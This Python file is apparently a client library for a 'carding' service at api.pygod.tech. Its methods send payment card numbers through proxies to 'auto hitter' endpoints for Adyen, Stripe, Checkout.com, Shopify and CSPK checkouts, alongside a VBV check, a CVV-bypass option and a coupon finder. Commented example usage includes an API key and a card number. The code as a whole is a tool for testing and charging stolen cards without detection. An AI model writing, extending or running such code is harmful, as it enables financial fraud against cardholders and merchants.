import json
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.padding import PKCS7
import os, requests


class VDXCipher:
    def __init__(self) -> None:
        self.IV_LENGTH = 16
        self.SALT_LENGTH = 16
        self.ITERATIONS = 100000
        self.KEY_LENGTH = 32

    def derive_key(cls, secretkey: str, salt: bytes) -> bytes:
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=cls.KEY_LENGTH,
            salt=salt,
            iterations=cls.ITERATIONS,
            backend=default_backend()
        )
        return kdf.derive(secretkey.encode())

    def create_payload(cls, json_data: dict, secretkey: str) -> str | None:
        try:
            json_str = json.dumps(json_data)
            salt = os.urandom(cls.SALT_LENGTH)
            iv = os.urandom(cls.IV_LENGTH)
            key = cls.derive_key(secretkey, salt)

            cipher = Cipher(algorithms.AES(key), modes.CBC(iv),
                            backend=default_backend())
            encryptor = cipher.encryptor()

            padder = PKCS7(algorithms.AES.block_size).padder()
            padded_data = padder.update(json_str.encode()) + padder.finalize()

            encrypted_data = encryptor.update(
                padded_data) + encryptor.finalize()

            return base64.b64encode(salt + iv + encrypted_data).decode()
        except Exception as e:
            # print(f"Encryption error: {e}")
            return None

class VDXApi(VDXCipher):
    def __init__(self, apikey:str) -> None:
        super().__init__()
        self.apikey = apikey
        self.base_url = "https://api.pygod.tech/v1/{}"
    
    def make_request(cls, method: str = "GET", endpoint:str = "ping", params = {}, payload = None):

        try:
            if method == "GET":
                
                params['key'] = cls.apikey
                response = requests.get(cls.base_url.format(endpoint), params=params)
                data = response.json()
                return response.status_code, data
            
            if method == "POST":
                headers = {'Content-Type': 'application/json'}
                
                data = cls.create_payload(payload, cls.apikey)

                if not data:
                  return 400, {"error": "Payload encryption failed. Please provide valid data."}
                
                json_data = {
                    "key": cls.apikey,
                    "data": data,
                }
                response = requests.post(cls.base_url.format(endpoint), headers=headers, json=json_data, params=params)
                data= response.json()
                return response.status_code, data
            
            if method not in ["POST", "GET"]:
                  return 400, {"error": "The specified HTTP method is not allowed. Please use POST or GET."}

        
        except Exception as er:
            return 500, dict(error=f"An error occured: {str(er)}")
        
    
    def adyen_encrypt(self, card:str, pubkey:str):
        """
        Adyen encryption
        """
        payload = {
            "card":card,
            "pubkey":pubkey,
        }
        status, response  =  self.make_request("POST", "adyen_encrypt", payload=payload)
        return response
    
    def adyen_hitter(self, url:str, card:str, proxy:str):
        """
        Adyen auto hitter
        """
        payload = {
            "card":card,
            "proxy": proxy,
            "url": url,
        }
        status, response  =  self.make_request("POST", "adyen", payload=payload)
        return response
    
    def stripe_intent(self, card:str, proxy:str, sk:str= None, pk:str = None, amount: int = 1, currency:str = "usd"):
        """
        Stripe Payment Intents charge
        """
        payload = {
            "card":card,
            "proxy": proxy,
            "amount": amount,
            "currency": currency,
            "sk":sk,
            "pk":pk

        }
        status, response  =  self.make_request("POST", "stripe", payload=payload)
        return response
    
    def stripe_invoice(self, invoice_url:str, card:str,  proxy:str):
        """
        Stripe Invoice auto hitter
        """
        payload = {
            "card":card,
            "proxy": proxy,
            "invoice_url": invoice_url
        }
        status, response  =  self.make_request("POST", "stripe_invoice", payload=payload)
        return response
    
    def pay_checkout(self, checkout_url:str, card:str, proxy:str):
        """
        Checkout.com Auto hitter
        """
        payload = {
            "card":card,
            "proxy": proxy,
            "url": checkout_url
        }
        status, response  =  self.make_request("POST", "pay_checkout", payload=payload)
        return response
    
    def vbv_check(cls, card_number:str, proxy:str):
        """
        VBV check
        """
        payload = {
            "card": card_number,
            "proxy": proxy
        }
        status, response  =  cls.make_request("POST", "vbv", payload=payload)
        return response
    
    def shopify_graphql(cls, product_url:str, card: str, proxy: str, email:str =None, ship_address:dict=None,  localize: bool = False, is_non_shipping_product:bool = False):
        """
        Shopify GraphQL checkout (version 1)
        """
        payload = {
            "card": card,
            "proxy": proxy,
            "product_url": product_url,
            "localize": localize,
            "is_gift_card": is_non_shipping_product,
            'email': email,
            'ship_address': ship_address
        }
        status, response  =  cls.make_request("POST", "shopify_graphql", payload=payload)
        return response
    
    def cspk(cls, pkkey:str, client_secret:str, card:str, proxy:str, cvvbypass: bool = False):
        """
        CSPK Auto hitter
        """
        payload = {
            "pk": pkkey,
            "cs": client_secret,
            "card": card,
            "proxy": proxy,
            "cvvbypass": cvvbypass
        }
        status, response  =  cls.make_request("POST", "cspk", payload=payload)
        return response
    
    def coupons(cls, query:str, proxy:str = None):
        """
        Coupons finder 
        """
        params = {"query": query, "proxy": proxy}
        status, response  =  cls.make_request("GET", "coupons", params=params)
        return response



# key = "VDX-EVNN5-ZGDAG-JGZEG"
# api = VDXApi(key)
# proxy = "host:port:user:password"

# Example usage

# data =  api.vbv_check("4147182091002446", proxy)
# print(data)

# coupon_data = api.coupons("stealthwriter ai")
# print(coupon_data)

